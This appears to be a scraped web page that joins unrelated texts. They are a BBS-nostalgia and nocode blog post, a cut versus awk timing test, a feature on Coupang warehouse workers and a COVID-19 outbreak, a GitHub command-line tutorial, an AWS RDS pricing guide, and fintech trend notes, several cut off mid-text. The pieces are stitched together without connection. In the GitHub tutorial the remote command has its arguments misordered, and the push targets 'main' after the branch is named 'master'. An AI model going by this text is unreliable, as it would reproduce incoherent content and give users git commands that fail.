on the Amiga. I think I settled on AmiExpress, which was easy to get running but
offered limited options for customising the user experience. There was a
messaging area, a chat facility with the sysop should they be awake, and the
all-important file exchange for uploading and downloading goodies. And it was
sparkling ANSI colourful out-of-the-box. My friend’s brother swore by the Paragon
BBS software which was clunkier but allowed you to install small text games like
snake. But he was a traitor and shortly thereafter switched the Amiga to a PC.</p><p><img src="https://blog.saltcorn.com/files/serve/4"></p><p>I liked exploring the different BBS software systems though.
They weren’t particularly configurable, it was mostly options that could be
switched on and off and some ASCII art that could be configured. At some point I
heard a rumour of something amazing: Freeform. <a href="http://software.bbsdocumentary.com/COMMODORE/AMIGA/FREEFORM/" target="_blank">Here is the only reference</a> I can find on
the Internet to Freeform, which promised to change everything for BBS sysops:<o:p></o:p></p><blockquote>This new BBS software not only allows every config value
imaginable to be set/changed by the SysOp, but the entire design and
flow-of-logic that operates the bbs can also be altered. It will eventually be able to emulate
menus/msg-bases/file-bases/etc of all known (42) Amiga BBS software packages
(as well as those of your own design). SWHQ is currently beta-testing this software.</blockquote><p>I had yet to learn the meaning of the word “vapourware”, so I
was very excited. Imagine being able not just to switch the text but also the
logic flow! If I had had that kind of power, I would probably have had no idea what
to do with it. <o:p></o:p></p><p>Freeform never happened. Much as I looked, I never found any
further information or updates from the project. And eventually I too became a
traitor and switched to a PC.<o:p></o:p></p><p>I started thinking back to Freeform almost 30 years later when
I began to work on Saltcorn, an open-source nocode platform. In
many ways, BBSes were the websites of their time, and BBS software systems
compare to nocode platform in the trade-offs they make between ease-of-use and
configurability. The BBSes were not serious businesses in the same way that apps
can be real startups with venture capital funded stand-up ceremonies
in bona-fide co-working spaces. Which precisely answers the charge that my
programming friends make against nocode products: that they are ticking time
bombs of technical debt, that they will never scale or be anything buy a toy. To
which I say: there are plenty of websites and applications and information
products out there that can be built without an engineer in sight and that may
not be unicom prospects but still deliver real value to their communities. One
can do an awful lot with WordPress, an indisputable nocode success story. The
next generation of nocode platforms are about pushing the boundaries of what
can be built without funding , without an engineering team and without writing
a line of code. <o:p></o:p></p><p>So even if Freeform never existed, or was just a cruel joke, I
am building it under a new name 30 years later as a gift to all the socially awkward teenagers out there and anyone else who has a
burning idea they need to build. Just do not use it for pirating cracked games,
it is not going to make you look cool.<o:p></o:p></p></div></div>]]>

<br>
<h3>The UNIX philosophy</h3>

<p>
In UNIX, there is (or used to be) a philosophy which, among other things, 
stipulates that a piece of software should do "one thing well". There is 
of course a long-running debate over not only what this really means, 
but also about whether certain programs - if any at all - still adhere 
to this, or ever did.
</p>

<p>
So, we're allegedly in the middle of a dangerous downward spiral of 
constant feature creep and a growing number of command parameters that 
will, eventually, lead to a Grand Unified Program that does everything
poorly (Depending on your personal preference and current mood, replace
the GUP with systemd, Emacs, Windows or Google Chrome as you see fit).
</p>

<p>
I for one find the concept of the UNIX philosophy of doing one thing 
well amicable. I also realize that it is a product of a time when 
computers still mostly passed around text files, and that those text 
files were considered preposterously huge if they exceeded a couple of 
megs in size. Heck, the modern GUI was still a research project at PARC 
when Doug McIlroy wrote the UNIX philosophy down in 1976.
</p>

<h3>Thinkin' 'bout philosophy</h3>
<p>
So, what does it mean to do one thing and do it well? Well, awk has been
a staple of any UNIX diet since the late 1970s. I think it's a lovely
little tool which I use even for rather mundane tasks. It's certainly
changed a bit over the years, but the core concept of the language
remains the same. Still, it's a complete programming language and
can do a lot more than a simple, single-purpose command.
</p>

<p>
The cut command is slightly newer, but like awk, it's a part of the 
POSIX standard. It can also hardly be considered to have suffered much 
feature creep: it's got a rather stringent set of parameters and really 
does just one thing, which is cutting a smaller piece of text out of a 
larger piece of text.
</p>

<p>
The question is of course, does the UNIX philosophy still hold up? Is it always
better to have one small program doing one thing well, as opposed to a
slightly bigger program doing many things? Let's examine this by performing
a simple task with two slightly different twists.
</p>

<h3>Task number one</h3>

<p>
Task number one was to print the second column of a three-column file with
10,000 rows, with a single space separating the columns. This task was
repeated 100 times.
</p>

<p>
<b>cut (GNU coreutils, 43224 bytes)</b>
</p>
<pre>cat cva_in1 | cut -d ' ' -f 2 &gt; /dev/null

real    0m0.297s
user    0m0.288s
sys     0m0.153s
</pre>

<p>
<b>awk (gawk, 658072 bytes)</b>
</p>
<pre>cat cva_in1 | awk '{print $2}' &gt; /dev/null

real    0m0.818s
user    0m0.754s
sys     0m0.232s
</pre>

<p>
<b>Python 3 (Python 3.6, 4526456 bytes + libraries)</b>
<br>
My go-to language for farting around with programming ideas, thus
included for reference. The below two lines of code were written to
a script through which the input was piped and, just as above,
redirected to /dev/null:
</p>
<pre>import sys
for l in sys.stdin: print(l.split()[1])

real    0m5.423s
user    0m4.753s
sys     0m0.873s
</pre>

<p>
As is clearly evident from this highly scientific performance test,
cut is by far the fastest tool for the job. I tried a few different
approaches with Python (such as opening the file from the script
instead of piping it), but they were all similarly slow.
</p>

<h3>Task number two</h3>

<p>
This time, things were spiced up by printing the fifth column in a file 
with unevenly-spaced columns, using the output from "ls -l". The file 
used for testing contained 2235 lines. This task was also repeated 100 
times. Since cut doesn't quite cope with this uneven spacing, we had to 
put the magic of the UNIX philosophy to work using pipes: this time, tr 
was involved as well, stripping away spaces to make each row 
understandable to cut.
</p>

<p>
<b>cut + tr (GNU coreutils, 47288 bytes)</b>
</p>
<pre>cat cva_in2 | tr -s ' ' | cut -d ' ' -f 5 &gt; /dev/null

real    0m0.212s
user    0m0.371s
sys     0m0.138s
</pre>

<p>
<b>awk</b>
</p>
<pre>cat cva_in2 | awk '{print $5}' &gt; /dev/null

real    0m0.460s
user    0m0.379s
sys     0m0.225s
</pre>

<p>
<b>Python 3</b>
</p>

<pre>import sys
for l in sys.stdin: print(l.split()[4])

real    0m4.450s
user    0m3.693s
sys     0m0.934s
</pre>

<p>
Despite the extra pipe, it seems the UNIX philosophy comes out
on top this time as well.
</p>


<h3>A few notes</h3>
<p>
This is of course not an exhaustive test and proves little, if anything 
at all, about he UNIX philosophy. I just wanted to perform a simple test 
with a scenario that at least I have come across many different 
times in many different scripts and many different languages.
</p>

<p>
In a typical daily scenario, I would personally have picked awk for task 
two and saved myself a bit of typing and figuring. This would have made 
no significant impact on perceived performance, because I usually don't 
deal with very large files and in most cases, the time I spend with 
tools I'm less comfortable with far exceeds the time I then spend 
waiting for the script. Still: based on nothing but gut feeling, I 
actually expected awk to be faster or at least comparable for task two. 
So much for my gut.
</p>

<p>
For coping with more complex scenarios without resorting to a language 
proper, more pipes will have to be added and more command line utilities 
will have to be invoked if we want to keep on using tools compliant with 
the UNIX philosophy. This can likely lead to worse performance, but this 
test just goes to show (for the umpteenth time) that the tool we 
instinctively reach for to tackle a task might not be the right one.
</p>

<p><span>J</span>eon Woo-oak has the numb, strained aspect of someone forced to grieve in the public eye. It has been months since she recovered from Covid-19, but she is still nervous in public spaces, preferring to meet in a rented private study rather than a cafe. “I’m worried I might get it again,” Jeon says.</p>



<p>In late May, an outbreak of the novel coronavirus swept through a warehouse owned by the e-commerce company Coupang in Bucheon, South Korea, where Jeon, 45, worked. Jeon caught the virus and brought it home to her 23-year-old daughter and husband. She asked for their names not to be published, to protect their privacy.</p>



<p>After their diagnoses, the three shared a room at the Incheon Medical Center. They spent the first few days keeping each other in good spirits, discussing what to eat when they got out. But without warning, the infection spread to Jeon’s husband’s lungs, where the damage it inflicted appeared in X-rays as ghostly white blots. At around noon on June 7, her husband video-called from the intensive care unit, assuring Jeon that he was fine. About four hours later, he suffered cardiac arrest, then fell into a coma.&nbsp;</p>



<p>“He’s been unconscious for three months, but he’s not going to get any better at this point, so I have to move him to a long-term care facility this weekend,” says Jeon. “But they can only manage his condition there. If he develops pneumonia again, I’ll have to move him back to the hospital.”</p>



<p>Jeon began working at Coupang, the biggest player in South Korea’s e-commerce market, in April. At the time, the Bucheon facility — a<a href="http://www.hani.co.kr/arti/area/capital/946873.html"> six-story</a> refrigerator where fresh food products are stored and packaged for delivery to the surrounding greater Seoul area — was one of the few places hiring. Jeon’s husband had been furloughed, and the family was struggling to make ends meet, so she signed a three-month contract.</p>



<p>On <a href="http://www.hani.co.kr/arti/society/society_general/946782.html">the morning</a> of May 24, authorities reportedly called Coupang to notify them that a Covid-19 case had been traced back to its Bucheon warehouse. Work was suspended for three hours while the facility was disinfected. When Jeon came in later that afternoon, at 5 p.m.,&nbsp;shift managers had already made the announcement to the hundreds of workers packed into the narrow foyer. When Jeon and her colleagues asked where in the facility the infections had been traced to, they were rebuffed. “Then they told the rest of us to go to our workstations, saying we were safe,” she says.</p>



<p>Even before the outbreak, the risks of working in a windowless warehouse, where everyone breathed the same stale air, had been obvious. “We would always tell each other, ‘When it happens here, it’s going to be a complete disaster. We are all going to die,’” recalls Jeon.&nbsp;</p>



<p>She took every possible precaution, using her car instead of the employee shuttle and the stairs instead of the elevator. During her shift, she wore a mask and gloves. Not wanting to wait in the long line for the cafeteria, where people would eat crammed together with their faces uncovered, she skipped dinner. It wasn’t enough. The Bucheon warehouse carried on as usual, until the evening of May 25, almost two full working days after officials were warned of a possible outbreak. Jeon tested positive on May 26. In total, <a href="http://www.hani.co.kr/arti/society/society_general/960422.html">there were 152 Covid-19 cases traced to the warehouse</a>: 84 employees, as well as 68 others infected from subsequent contact.</p>



<p>Jeon holds the company responsible for failing to take the necessary precautions to prevent the outbreak. “I’ve told Coupang that my husband is extremely ill, and that I want both a sincere apology and compensation,” she says.</p>



<p>Coupang declined to comment.</p>



	




<p>Coupang’s apparent mishandling of the outbreak at Bucheon is embarrassing for a company that styles itself as a socially conscious innovator, one that offered delivery workers secure, full-time jobs while revolutionizing Korea’s e-commerce industry, the fifth largest in the world. But to stay ahead of its rivals, the company has driven its employees harder and harder, trying to win by turning around orders faster than anyone else. This year, at least two workers have died — in March, <a href="https://koreajoongangdaily.joins.com/news/article/article.aspx?aid=3075014&amp;cloc=joongangdaily%257Chome%257Cnewslist1">a Coupang delivery man was found dead</a> on the steps of a residence where he had been delivering packages, and in May, <a href="https://www.yna.co.kr/view/AKR20200529127100065">a worker, in their 40s, at another Coupang warehouse died</a> after collapsing in a bathroom. Warehouse workers and delivery drivers describe these deaths as the inevitable outcome of a business ethic that prioritizes rapid delivery over employee safety.</p>



<p>“Even before [the Bucheon outbreak], I’d been struck by how the company seems to treat workplace injuries as a given and what I’ve perceived to be a deep-rooted and widespread problem of neglecting worker safety,” says labor researcher Jang Kwi-yeon, who has studied working conditions at Coupang. “Coupang has grown tremendously in the span of just a few years, and the intensity of work just keeps on increasing.”</p>



<p>When Covid-19 struck, and homebound consumers turned in unprecedented numbers to e-commerce, the pressure worsened, and more workers were put in harm’s way. As another former Bucheon worker told <em>Rest of World</em>: “What was bound to happen has happened.”</p>

<hr>



<p><strong>Coupang — a portmanteau</strong> of <em>coupon</em> and the sound of one going off: <em>pang!</em> — was launched in August 2010 by Kim Beom-seok, a Korean American in his early 30s, as a daily-deals “social commerce” venture modeled on Groupon. Launched with backing from <a href="https://www.thebell.co.kr/free/Content/ArticleView.asp?key=202005130817397220108943">Clayton Christensen’s Disruptive Innovation Fund</a>, it was turning a modest profit by 2012, when Kim — who goes by “Bom Kim” in English — decided to take the company public on the Nasdaq.&nbsp;</p>



<p>The weekend before the listing was due, Bom Kim pulled the plug. His vision, he had said in numerous interviews, was to create something that left customers saying, “How did I ever live without Coupang?” — and his company wasn’t that. From then on, the company would model itself not on Groupon, but on Amazon.&nbsp;</p>



<p>By 2015, Coupang had built something that surpassed even Amazon: a long, unbroken supply chain, whereby products moved seamlessly from warehouse to driver to customer, with&nbsp;99% of orders delivered within 24 hours, all year and 7 days a week. (Amazon has since made a similar delivery network.) In 2016, Coupang was <a href="https://www.technologyreview.com/lists-tr50/50-smartest-companies-2016/intro%23Coupang">named one of the 50 Smartest Companies</a> by <em>MIT Technology Review</em>. The same year, Bom Kim appeared on <em>Forbes</em>’ “Global Game Changers” list with the tagline “beating Jeff Bezos at his own game.”</p>



<p>Like Bezos, Bom Kim had rightly predicted that faster and “frictionless” delivery — not just competitive pricing and wide selections — would be the future of e-commerce. And with its dense, smartphone-friendly urban populations, South Korea was close to a perfect market. At the time, a slate of third-party marketplaces and Groupon imitators made up most of the country’s e-commerce sector.</p>



<p>“In modeling itself after Amazon by investing aggressively in its own logistical infrastructure, Coupang swooped in and set an entirely new standard for e-commerce [in South Korea],” says Im Il, a professor at the Yonsei University School of Business in Seoul. “It eventually sparked both a price war and a delivery war across the entire market.”</p>



<p>E-commerce in South Korea was dogged by a challenge common to online retail around the world. So-called last-mile delivery — the stretch of the delivery process in which the package moves from hub to consumer — was expensive, time-consuming, and unreliable when handled by third-party shipping companies. Late, damaged, or lost packages were immensely consequential to customer satisfaction but nearly always out of a retailer’s control.&nbsp;</p>



<p>Logistics, <a href="https://news.joins.com/article/19605320">Bom Kim believed</a>, was “a fight of minutes and seconds.” In 2013, Coupang acquired the data-analytics company CalmSea and began to deploy artificial intelligence to pare down delivery times. Machine learning helps the company predict consumption patterns and position stock so that it is closest to likely buyers. In its warehouses, Coupang uses the same “random-stow” system as Amazon, in which algorithms tell stockers where to store items based on purchasing patterns, rather than on category. On deliveries, artificial intelligence software plots optimal routes for drivers and tells them where and how to stack packages in the truck.&nbsp;</p>



<p>To cement Coupang’s control over the last mile, Bom Kim did something that few others in the industry wanted to: he hired his own drivers.</p>



<p>In March 2014, the company launched what has since become its crowning achievement, Rocket Delivery, <a href="https://www.hankyung.com/economy/article/202007230105i">starting with 50</a> “Coupang Men” — full-time drivers in branded trucks — who guaranteed next-day delivery of packages, which the company calls “gifts.”</p>



<p>Referred to internally as “spreaders of happiness,” Coupang Men were the spiritual ambassadors of the company. To win over female customers in their 20s and 30s — a key demographic — Coupang Men handed out flowers and handwritten cards, snapped photos of packages to confirm delivery, and would know not to ring the doorbell at homes with babies.</p>



<p>Bom Kim called them “<a href="http://news.khan.co.kr/kh_news/khan_art_view.html?artid=201503171633451&amp;utm_source=livere&amp;utm_medium=social_share">the weapon that Amazon doesn’t have</a>.” And unlike local shipping companies, which hired fleets of drivers on precarious temp contracts, Coupang Men were given a fair wage, full insurance coverage, annual health checkups, 15 vacation days a year, and company trucks and gas.&nbsp;</p>



<p>More importantly, the company offered drivers the opportunity to become “regular” employees in a line of work where this was virtually unheard of. (In South Korea, employees are divided into “regular” and “irregular” labor, with only the former receiving comprehensive legal protection.)</p>

<p>To execute this vision, Bom Kim courted talent from his competitors — including Amazon — who recognized in Coupang a similar, single-minded zeal. “I was very impressed with the strategy and control of the last mile,” Darrin Shamo, who left Amazon-owned shoe retailer …</p></div></div>

<p><a href="http://github.com/">GitHub</a> is a great tool to be used when programming, as it helps store your code over the internet. It makes your project more organized, easier to develop, and allows you to collaborate with friends or other developers. In addition, GitHub works smashingly with Visual Studio Code.</p>



<p><strong>If you’re still not recognizing a need for GitHub, do not worry  – you will soon.</strong></p>



<p>In this short tutorial, I’m going to show you how to connect your project with GitHub from the command line.</p>



<p><strong>Connecting to GitHub</strong></p>



<p>First, navigate to your project in your computer’s terminal and run:</p>



<pre><code>git init</code></pre>



<p>That will initialize your project with Git. Next, run:</p>



<pre><code>git add .</code></pre>



<p>That command will add all of your files to the git repository that we initialized in step 1. Next, run:</p>



<pre><code>git commit -m "Initial Commit"</code></pre>



<p>This commits all your files to your repository. Next, we need to set up a GitHub repository. To do this, go to <a href="http://github.com/">github.com</a> and either sign in or create an account. After that, create a new repository by clicking the “new” button on the sidebar on the left side of the screen.</p>



<figure><img loading="lazy" src="https://i2.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.29.02-AM.png?resize=337%2C105&amp;ssl=1" alt="" width="337" height="105" srcset="https://i2.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.29.02-AM.png?w=321&amp;ssl=1 321w, https://i2.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.29.02-AM.png?resize=300%2C93&amp;ssl=1 300w" sizes="(max-width: 337px) 100vw, 337px" data-recalc-dims="1"></figure>



<p>Next, give your repository a name, select if you want it to be public or private, and then click create at the bottom of the screen.</p>



<p>Now, copy the repository link from the top of the page.</p>



<figure><img loading="lazy" width="819" height="80" src="https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=819%2C80&amp;ssl=1" alt="" srcset="https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=1024%2C100&amp;ssl=1 1024w, https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=300%2C29&amp;ssl=1 300w, https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=768%2C75&amp;ssl=1 768w, https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?w=1194&amp;ssl=1 1194w" sizes="(max-width: 819px) 100vw, 819px" data-recalc-dims="1"></figure>



<p>Then, go back to your terminal. After, run the following command:</p>



<pre><code>git branch -M master</code></pre>



<p>This creates a master branch for your repository. Finally, run:</p>



<pre><code>git remote origin add &lt;repository link&gt;</code></pre>



<p>Make sure to replace <code>&lt;repository link&gt;</code> with your GitHub repository link from above. The last thing we to do is to push all our files to GitHub! Do that with the following snippet:</p>



<pre><code>git push -u origin main</code></pre>



<p>Congrats! Now we’ve pushed our project to GitHub, and you should be able to see it if your reload your GitHub repository’s page.</p>



<p><strong>Making Changes</strong></p>



<p>However, let’s say you continue to edit your code. How can we update your GitHub repository? It can be updated with this series of commands:</p>



<pre><code>git add .
git commit -m "You Commit Message Here"

				<p>Amazon Web Services makes getting your data into their <a href="https://aws.amazon.com/rds/" target="_blank">Relational Database Service</a> (RDS) relatively easy. Import costs are free, and you can store up to <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_Limits.html#RDS_Limits.Limits" target="_blank">100 terabytes across all your instances</a>. AWS RDS hosts your relational databases in the cloud, and their engineers handle patching, monitoring, availability, and some security concerns.</p>

<p>These factors make getting started with AWS RDS easy, but understanding and controlling your costs is another matter entirely. In this article, you’ll learning the following with AWS RDS:</p>

<p>Instance usage, storage, I/O, backups, and data transfers drive the bulk of your AWS RDS costs. Instance usage and storage are unavoidable, but generally, you should minimize them while adequately addressing your needs. AWS RDS offers some I/O and backup capability bundled into the cost of storage, but you might need more. Moving data into RDS from the internet is free, but moving it out of RDS can get expensive.</p>

<p>In this section, I’ll dive deeper into each of AWS RDS’s pricing factors to help you understand how your usage might affect your monthly bill.</p>

<h2 id="rds-database-engine">RDS Database Engine</h2>

<p>Amazon currently offers six database engines: <a href="https://aws.amazon.com/rds/aurora">Amazon Aurora</a>, <a href="https://aws.amazon.com/rds/postgresql/" target="_blank">PostgreSQL</a>, <a href="https://aws.amazon.com/rds/mysql/" target="_blank">MySQL</a>, <a href="https://aws.amazon.com/rds/mariadb/">MariaDB</a>, <a href="https://aws.amazon.com/rds/oracle/" target="_blank">Oracle</a>, and <a href="https://aws.amazon.com/rds/sqlserver/" target="_blank">Microsoft SQL Server</a>. Normally you won’t be able to change your database engine, but you can choose to optimize for memory, performance, or I/O.</p>

<p>The three open-source databases (Postgres, MySQL, and MariaDB) are similar in price. Depending on the size, PostgreSQL instances are five to ten percent more expensive per hour, but PostgreSQL, MySQL, and MariaDB share pricing for storage, provisioned I/O, and data transfer.</p>

<p>AWS Aurora is Amazon’s proprietary database, so it gets special treatment. AWS offers a <a href="https://aws.amazon.com/rds/aurora/serverless/" target="_blank">serverless option</a>, making it ideal for applications that don’t need to be on all the time, like test environments. Aurora also has a <a href="https://aws.amazon.com/rds/aurora/global-database/" target="_blank">multi-zone backup system</a> that charges per million replicated I/O operations. Storage per gibibyte (GiB) is a few cents more expensive, but if you’re dealing with intermittent usage or need fast failovers and many read replicas, Aurora can save money over implementing these features on other engines.</p>

<p>Oracle and SQL Server aren’t open-source or owned by Amazon. To accomodate licensing, hourly instances can cost nearly twice as much. You can self-license with Oracle, which brings the cost in line with open-source options. Other fees, like storage and data transfer, match their open-source counterparts.</p>

<p>While this guide isn’t intended to help you choose the best database engine, it is important to note that pricing varies based on the engine you choose.</p>

<h2 id="rds-instance-sizes">RDS Instance Sizes</h2>

<p>Once you select an engine, you have to select an RDS <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.DBInstanceClass.html" target="_blank">instance size</a> with the appropriate computational (vCPU), network (Mbps), and memory capacity (GiB RAM). RDS offers instances ranging from <code>db.t3.micro</code> (2 vCPUS, 1 GiB RAM, 2085 Mbps) to <code>db.m5.24xlarge</code> (96 vCPUS, 384 GiB RAM, 19,000 Mbps).</p>

<p>Selecting the right RDS instance size can be challenging. To estimate the RDS instance size you’ll need, estimate or track the amount of data your queries need (called your <a href="http://www.tocker.ca/2013/05/31/estimating-mysqls-working-set-with-information_schema.html" target="_blank">working set</a>), then select an instance that can fit your working set into <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html#CHAP_BestPractices.Performance.RAM" target="_blank">memory</a>. I’ll touch on RDS monitoring and right-sizing your RDS instances later in this guide.</p>

<h2 id="reserved-instances">Reserved Instances</h2>

<p>Without additional configuration, RDS instances are created on-demand. These instances are billed in one-second increments from the moment the instance starts to its termination. You can stop, start, or change an on-demand <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.DBInstance.Modifying.html" target="_blank">instance size</a> at any time.</p>

<p>The alternative to on-demand pricing is <a href="https://aws.amazon.com/aws-cost-management/aws-cost-optimization/reserved-instances/" target="_blank">Reserved Instances</a> for RDS. You commit to lease an RDS instance for a set period (1 or 3+ years) in exchange for discounts up to 60%. AWS offers sizing flexibility for all Reserved Instance engines except SQL Server and License Included Oracle, allowing administrators to freely change instance size within the same family. If you’re able to commit to RDS for a year or three and have monitored your requirements enough to develop a solid performance baseline, you can save money by trading away the flexibility to turn off or downsize your databases.</p>

<h2 id="rds-storage-aurora-and-autoscaling">RDS Storage: Aurora and Autoscaling</h2>

<p>For most engines, you buy storage per GiB in advance. Aurora is the exception: you only pay for what you use. It’s important to accurately predict your monthly storage needs as you <a href="https://aws.amazon.com/premiumsupport/knowledge-center/rds-db-storage-size/">cannot reduce storage</a> on an instance (<a href="https://aws.amazon.com/about-aws/whats-new/2020/10/amazon-aurora-enables-dynamic-resizing-database-storage-space/" target="_blank">except Aurora</a>).</p>

<p>AWS can <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_PIOPS.StorageTypes.html#USER_PIOPS.Autoscaling" target="_blank">auto-scale</a> your storage when an instance has under 10% space remaining for more than 5 minutes. This option has the benefit of keeping storage costs low, but can surprise you if something unexpected happens. To protect against auto-scaling to 65,536 GiB, set a maximum storage threshold for your instance.</p>

<p><img src="https://www.cloudforecast.io/blog/assets/media/autoscaling.png" alt="Enabling a storage threshold for auto-scaling" title="RDS Aurora and Autoscaling Thresholds"></p>

<p>If you can accurately predict your storage needs, manually provisioning is the cheapest option. If you’re facing unpredictability or unused storage, consider auto-provisioning and focus on maintaining a reasonable storage maximum.</p>

<h2 id="rds-backups">RDS Backups</h2>

<p>AWS backs up 100% of the storage you’ve purchased in any zone for free. If you buy 20 GiB of storage across two instances, it includes 20 GiB of backup space.</p>

<p>If you need more space for backups, you pay per GiB at a slightly lower rate than regular storage costs. RDS automatically backs up each storage volume every day. These backups are stored according to the backup retention period. Automated backups will not occur if the DB’s state is not <code>AVAILABLE</code> (for example, if the state is <code>STORAGE_FULL</code>). Users can also create manual backups. These never expire and count against your backup storage total.</p>

<h2 id="regions">Regions</h2>

<p>As with most AWS services, RDS costs are specific to a <a href="https://aws.amazon.com/about-aws/global-infrastructure/regions_az/" target="_blank">region</a>. Choose your region carefully because the most expensive regions double the hourly cost of instances, increase storage by a few cents per GiB, and 5x inter-zone data transfer pricing.</p>

<p>On the other hand, if your database is located further from your application servers, you’ll add latency to every database call. If this latency degrades user experience, you probably don’t want to use a distant, slightly cheaper region.</p>

<h2 id="multi-az-deployments">Multi-AZ Deployments</h2>

<p>If you need availability when an AWS regional data center encounters trouble, you can enable <a href="https://aws.amazon.com/rds/features/multi-az/" target="_blank">Multi-AZ deployments</a>. This creates a backup database instance and replicates your data to a second AWS data center. Be aware that this <strong>doubles your monthly instance and storage costs</strong> but enhances the reliability of critical services. If you need a Multi-AZ deployment, focus on reducing your storage needs and instance size, these gains are won twice.</p>

<hr>



<p>Once you understand the many options RDS offers and set up an instance, there are a few tools that will help you audit your current usage and predict future requirements.</p>

<h2 id="aws-cost-explorer">AWS Cost Explorer</h2>

<p>The best way to audit your RDS spending is the <a href="https://aws.amazon.com/aws-cost-management/aws-cost-explorer/" target="_blank">AWS Cost Explorer</a>. Activating and examining your daily or monthly spend is an excellent way to visualize your organization’s priorities.</p>

<p><img src="https://www.cloudforecast.io/blog/assets/media/rds_costexplorer.png" alt="Using the AWS Cost Explorer to see your RDS spend" title="AWS Cost Explorer"></p>

<p><a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">Tagging your resources</a> helps you understand which projects and teams are using which databases. Cost Explorer also offers <a href="https://docs.aws.amazon.com/savingsplans/latest/userguide/sp-recommendations.html" target="_blank">suggestions</a> for using reserved instances based on your past usage.</p>

<h2 id="rds-management-console-and-enhanced-monitoring">RDS Management Console and Enhanced Monitoring</h2>

<p>AWS provides a “Monitoring” tab in the RDS Console that displays free-tier CloudWatch metrics like the number of connections and CPU utilization. Keeping an eye on your usage in the console can help you prepare to right-size your storage or purchase reserved instances.</p>

<p><img src="https://www.cloudforecast.io/blog/assets/media/rds_cloudwatch.png" alt="Using the RDS Console to see your RDS utilization" title="CloudWatch"></p>

<p>AWS gives you the option to activate additional monitoring services.</p>

<p><a href="https://aws.amazon.com/rds/performance-insights/" target="_blank"><strong>Performance Insights</strong></a> gathers data about the database load. This tool has its own <a href="https://aws.amazon.com/rds/performance-insights/pricing" target="_blank">pricing model</a> with a free tier that includes 7-day retention.</p>

<p><a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_Monitoring.OS.html" target="_blank"><strong>Enhanced Monitoring</strong></a> is stored and priced as <a href="https://aws.amazon.com/cloudwatch/pricing/" target="_blank">CloudWatch logs</a>. It reports metrics from a user agent instead of the hypervisor, allowing you to examine running processes and the OS, which is useful for examining the resource usage of individual queries.</p>

<p>Finally, you can enable and access <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_LogAccess.html" target="_blank">database logs</a> directly for the price of storing the files.</p>

<h2 id="cloudforecast">CloudForecast</h2>

<p><a href="https://www.cloudforecast.io/" target="_blank">CloudForecast</a> supplements AWS’s Cost Explorer through proactive monitoring and optimization reports that keeps your RDS cost in check.</p>

<p>Through the <a href="https://cloudforecast.io/aws-daily-cost-report-tool.html">daily cost reports</a>, you’ll receive a daily report via email or slack that details your RDS cost in relation to your overall spend and alerts you of any cost anamolies with RDS.</p>

<p>The <a href="https://www.cloudforecast.io/aws-tagging-compliance-report.html" target="_blank">tagging compliance report</a> helps make sure your RDS instances are properly tagged and let you know exactly which RDS resources are not following compliance.</p>

<p>Finally, the <a href="https://www.cloudforecast.io/kb/docs/general-info/whatis/#aws-cost-optimization" target="_blank">ZeroWaste Health Report</a> (beta) let’s you know of possible inefficiencies by identifying all your over-provisioned and unused RDS instances in one single report.</p>

<hr>



<p>Armed with insights into your requirements and RDS’s abilities, it’s time to put cost-saving measures and AWS <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html" target="_blank">best practices</a> to use. In the rest of this guide, I’ll offer some strategies for decreasing your RDS costs using the insights you gathered above.</p>

<h2 id="right-sizing-your-instances">Right Sizing your Instances</h2>

<p>In short, turn off anything that’s not being used.</p>

<p>Every month, you pay for instances and storage and the infrastructure attached to them. You can check each database’s utilization using the connections metric in the RDS Console. On-demand RDS instances can be stopped for up to 7 days. When stopped, you aren’t charged for DB Instance hours, but you are charged for storage. You can use an AWS Lambda <a href="https://docs.aws.amazon.com/lambda/latest/dg/services-cloudwatchevents-tutorial.html" target="_blank">scheduled event</a> and DB Instance API calls to programmatically stop and start instances.</p>

<p>To practice <a href="https://aws.amazon.com/aws-cost-management/aws-cost-optimization/right-sizing/" target="_blank">right-sizing</a>, act on your monitoring and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><span>You can read the first part of this article <a href="https://s-pro.io/blog/customer-oriented-fintech-10-key-trends-in-2021">here</a>. For those who for some reason don’t like to follow the links, let me remind you briefly: in the first part, we made a retrospective of fintech trends in 2020 and delved into the first 5 trends in 2021.</span></p>
<p><span>So what in my opinion awaits us next?</span></p>
<p><b>6. Hyper-Personalization in banking</b></p>
<p><span>Banks are moving into the segment of sales of packaged digital products and personalize various services for customer needs. For example, a personalized financial plan for a young couple, for a student, for older people, and so on.&nbsp;</span></p>
<p><span>Hyper-personalization in banking gives users more flexibility in products and services. For example, based on the relationship with the bank, credit standing, and asset base, the bank recommends to clients how they can design a loan to fit their needs. The customer chooses one of the provided interest categories, duration, payment schedule, and the amount of the first instalment.</span></p>
<p><span>To hyper-personalize its services, banks must collect and analyze data from many different sources, including all types of interaction with the customer. Analyzing this data and creating insights allow banks to hyper-personalize the interaction into a holistic relationship, which drives differentiation and increases customer loyalty.</span></p>
<p><span>If the bank can sell a complex product that will be convenient and efficient, then there is the question of interaction between banks and other companies (gyms, shops, etc.). Therefore, this requires some flexibility.</span></p>
